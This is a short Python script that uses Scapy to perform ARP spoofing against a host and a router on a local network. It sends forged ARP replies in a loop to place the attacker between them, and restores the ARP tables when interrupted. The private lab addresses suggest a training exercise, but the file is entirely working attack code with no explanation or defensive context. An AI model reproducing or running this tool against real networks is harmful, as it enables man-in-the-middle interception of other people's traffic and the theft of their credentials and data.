#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof (target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,verbose=False)


target_ip = "10.0.2.19"
router_ip = "10.0.2.1"
#router_ip = "1192.168.1.1"

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        #spoof(target_ip, router_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Dectected CTRL + C ..... Resetting ARP tables...... Please wait.\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
